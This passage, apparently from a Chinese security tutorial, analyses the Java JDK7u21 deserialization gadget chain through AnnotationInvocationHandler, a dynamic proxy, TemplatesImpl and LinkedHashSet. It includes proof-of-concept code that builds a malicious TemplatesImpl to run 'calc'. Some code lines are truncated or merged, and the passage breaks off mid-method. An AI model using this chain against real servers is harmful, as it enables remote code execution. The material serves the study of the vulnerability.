    //var1 当前的Proxy代理实例对象，即a.b(c)的a
    //var2 当前调用的方法，即a.b(c)的b
    //var3 当前调用方法的传入参数列表，即a.b(c)的c
    public Object invoke(Object var1, Method var2, Object[] var3) {
            String var4 = var2.getName();//被调用方法名
            Class[] var5 = var2.getParameterTypes();//获取传入参数类型列表
        //如果调用的方法名是equals，传入一个参数，并且为Object类型,即a.equal((Object.class)c)
        //此处的意思应该为判断a是否与传入的c完全相等。
            if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
                return this.equalsImpl(var3[0]);//我们进入此处，传入的是a.b(c)中的c的第一个参数
            } else {
            ...
`sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl`
    //var1 a.b(c)的c
    private Boolean equalsImpl(Object var1) {
            // var1 若为AnnotationInvocationHandler类，就相等
            if (var1 == this) {
                return true;
            // var1 应该为this.type的实例 （此处为一个要求）
            // 此处意思应该是只能比较this.type中规定好的类是否完全一致
            } else if (!this.type.isInstance(var1)) {
                return false;
            } else {
                //如果是this.type（可控）中的类的实例的话
                //就要开始获取this.type这个类中的所有方法
                Method[] var2 = this.getMemberMethods();
                int var3 = var2.length;
               //去对应着遍历调用c对象中的Methods方法
                //把结果与在构造函数中定义的this.memberValues做对比，若一样则判定相等
                for(int var4 = 0; var4  ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
            //由于是缺省修饰符，不同的包，不能直接调用。允许调用
            ctor.setAccessible(true);
            //创建AnnotationInvocationHandler实例，this.type=Templates.class
            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);
            //Override是一个啥都没有的接口，这里用这个类，表示其实绑定啥都没关系
            //在高版本的jdk中，在构造函数中对于type做了校验，如果要在高版本中构造payload，需要使用反射机制构筑。如果对方也是高版本的jdk（即经过了修复）那么我们构筑的InvocationHandler类也是因为构造方法通过不了而无法利用。具体我们在后面修复情况中说到。
            //InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,map);
             //Reflections.setFieldValue(tempHandler, "type", Templates.class);
            //有些地方POC写的是Templates.class类，其实没必要
            Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),new Class[]{Override.class},invocationHandler);
            //恶意类
            final Object templates = Gadgets.createTemplatesImpl("calc");
            //调用，执行`TemplatesImpl.newTransformer()`
            proxy.equals(templates);
        }
#### this.type的讲究
为啥this.type需要选用类中第一个方法是我们需要调用的方法的类呢？
因为不是的话，就需要考虑更多，比如报错退出。可以看到在执行完我们的payload后是会报错退出的，当然这对我们paylaod的执行没有影响。
但是假如我们需要调用的方法不在第一个，而前面是一个需要参数的方法，就会因为没有传入参数而报错退出。（比如我们把Templates.class改成TemplatesImpl.class）
如果我们需要调用的方法前面有一些其他方法，但是都是不需要参数的，我们还需要构造this.memberValues，让前面这些函数的返回值与this.menberValues里面一致才不会返回false退出。就会有一串的麻烦（目前来看这样也是可行的，但是假如这里真的改了this.memberValues之后LinkedHashSet那关就过不去了！实际上我们只能且必须要找到一个第一个方法是能够代码执行的方法！）
所幸我们可以找到一个Templates类，它进行代码执行的方法是第一个，万幸。
## 进一步延伸至LinkedHashSet
接下来需要触发`proxy.equals(templates)`，这种`a.equals(b)`的形式。a是我们构建的动态代理返回对象，b是恶意TemplatesImpl类。
**LinkedHashSet类** 继承自 **Hashset**
，具有Hashset的全部特点：元素不重复，快速查找，快速插入。新增的特性是有序，数据结构上使用双向链表实现。（之所以用LinkedHashSet就是因为其有序的特性，后面会说到为什么需要有序）
`LinkedHashSet.java`
    public class LinkedHashSet
        extends HashSet
        implements Set, Cloneable, java.io.Serializable {
        ...
        //给一个我们要用到的构造函数
        public LinkedHashSet() {
                super(16, .75f, true);//进去这里看看
            }
        //LinkedHashSet这个类其实根本没有自己实现过类，只有四个构造函数，实际上使用LinkedHashMap实现有序功能的
        ...
        }
super就进入HashSet了，`HashSet.java`:
    HashSet(int initialCapacity, float loadFactor, boolean dummy) {
            map = new LinkedHashMap<>(initialCapacity, loadFactor);//可以看到使用LinkedHashMap创建了有序集合
        }
具体是如何实现这个集合的，我们就不纠结了。我们需要通过LinkedHashSet连接 **writeObject序列化与readObject反序列化**
这个利用链入口至 **a.equals(b)** 这个我们之前得到的触发点。
先看LinkedHashSet的序列化与反序列化。LinkedHashSet获取的是LinkedHashMap的实例，而LinkedHashMap又继承自HashSet，所以最终的序列化与反序列化就是在`HashSet类`中。
我们跟着反序列化触发链来看。
    //我们构造payload，最终调用writeObject 
    private void writeObject(java.io.ObjectOutputStream s)
            throws java.io.IOException {
            // 序列化任何隐藏的序列化魔术（不懂什么骚操作）
            s.defaultWriteObject();
            // 序列化map的容量与加载器
            s.writeInt(map.capacity());
            s.writeFloat(map.loadFactor());
            // 序列化map的大小
            s.writeInt(map.size());
            // 遍历序列化每一个map中的元素
            for (E e : map.keySet())
                s.writeObject(e);
        }
    //在服务端触发payload，最先触发的函数。
     private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
            // 反序列化任何隐藏的序列化魔术（不懂什么骚操作）
            s.defaultReadObject();
            // 反序列化HashMap容量和加载器并创建备份HashMap
            int capacity = s.readInt();
            float loadFactor = s.readFloat();
            map = (((HashSet)this) instanceof LinkedHashSet ?
                   new LinkedHashMap(capacity, loadFactor) :
                   new HashMap(capacity, loadFactor));
            // 反序列化map的大小
            int size = s.readInt();
            // 遍历反序列化每一个map的元素，并把他们加入到map中
            for (int i=0; i e = table[i]; e != null; e = e.next) {
                Object k;
                //本意是判断最新的元素是否已经存在的元素
                if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                    //如果是已经存在的元素，就返回已经存在的value。不插入。
                    V oldValue = e.value;
                    e.value = value;
                    e.recordAccess(this);
                    return oldValue;
                }
            }
            modCount++;
            //如果不是已经存在的元素，就插入到table中
            addEntry(hash, key, value, i);
            return null;